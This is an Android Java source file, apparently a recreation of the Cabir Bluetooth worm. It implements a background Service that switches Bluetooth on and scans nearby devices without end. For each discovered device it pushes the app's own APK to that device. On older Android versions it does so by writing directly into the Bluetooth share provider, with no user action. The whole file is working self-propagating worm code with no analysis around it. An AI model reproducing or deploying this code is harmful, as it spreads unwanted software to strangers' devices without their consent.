package com.shifz.cabir;

import android.app.Service;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by Shifar Shifz on 11/3/2015.
 */
public class Cabir extends Service {

    private static final String X = Service.class.getSimpleName();
    private static final String BUILT_IN_BLUETOOTH_APP = "com.android.bluetooth";
    private static final String BUILT_IN_BLUETOOTH_APP_OP_ACTIVITY = "com.android.bluetooth.opp.BluetoothOppLauncherActivity";
    private BluetoothAdapter bAdapter;

    public static final Map<String, BluetoothDevice> deviceList = new HashMap<>();

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Log.d(X, "Service started");

        bAdapter = BluetoothAdapter.getDefaultAdapter();

        if (bAdapter != null) {

            registerReceiver(onActionFound, new IntentFilter(BluetoothDevice.ACTION_FOUND));
            registerReceiver(onDiscoveryCompleted, new IntentFilter(BluetoothAdapter.ACTION_DISCOVERY_FINISHED));

            Log.i(X, "Bluetooth support available");

            if (!bAdapter.isEnabled()) {

                Log.d(X, "Turning on bluetooth");
                enableBluetooth();
            } else {

                Log.i(X, "Bluetooth already available");
                startDiscovery();
            }

        } else {

            Log.e(X, "Bluetooth not supported");

        }

        return START_NOT_STICKY;
    }

    private void enableBluetooth() {
        final Intent turnOnBluetooth = new Intent(this, BluetoothStarterActivity.class);
        turnOnBluetooth.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(turnOnBluetooth);
    }


    private void startDiscovery() {
        Log.i(X, "Starting discovery...");
        if (bAdapter.isEnabled()) {
            bAdapter.startDiscovery();
        } else {
            enableBluetooth();
        }
    }

    private final BroadcastReceiver onDiscoveryCompleted = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d(X, "Discovery finished");
            deviceList.clear();
            bAdapter.startDiscovery();
        }
    };

    private final BroadcastReceiver onActionFound = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            final String currentAction = intent.getAction();

            if (currentAction.equals(BluetoothDevice.ACTION_FOUND)) {
                Log.i(X, "Yahoo... device found");
                final BluetoothDevice device = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);
                if (device.getName() != null) {
                    deviceList.put(device.getAddress(), device);
                    Log.d(X, "Sending apk to " + device.getName());
                    sendApk();
                }
            }
        }
    };


    //Used to send the app's apk to the device
    private void sendApk() {

        if (!bAdapter.isEnabled()) {
            enableBluetooth();
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.ICE_CREAM_SANDWICH) {

            final Intent sendAction = new Intent(Intent.ACTION_SEND);
            sendAction.setType("*/*");
            sendAction.setComponent(new ComponentName(BUILT_IN_BLUETOOTH_APP, BUILT_IN_BLUETOOTH_APP_OP_ACTIVITY));
            sendAction.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(new File(getApplicationInfo().sourceDir)));
            sendAction.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(sendAction);

            final IntentFilter endFilter = new IntentFilter("android.bluetooth.device.action.ACL_DISCONNECTED");
            endFilter.setPriority(999);

            registerReceiver(onACLDisconnectedReceiver, endFilter);

        } else {
            for (final Map.Entry<String, BluetoothDevice> selectedDevice : deviceList.entrySet()) {
                final ContentValues cv = new ContentValues();
                cv.put(BluetoothShare.URI, "file://" + getApplicationInfo().sourceDir);
                cv.put(BluetoothShare.DIRECTION, BluetoothShare.DIRECTION_OUTBOUND);
                cv.put(BluetoothShare.DESTINATION, selectedDevice.getValue().getAddress());
                cv.put(BluetoothShare.TIMESTAMP, System.currentTimeMillis());
                getContentResolver().insert(BluetoothShare.CONTENT_URI, cv);
            }
        }


    }

    private final BroadcastReceiver onACLDisconnectedReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            bAdapter.startDiscovery();
        }
    };


    @Override
    public void onDestroy() {
        unregisterReceiver(onActionFound);
        unregisterReceiver(onACLDisconnectedReceiver);
        super.onDestroy();
    }

}
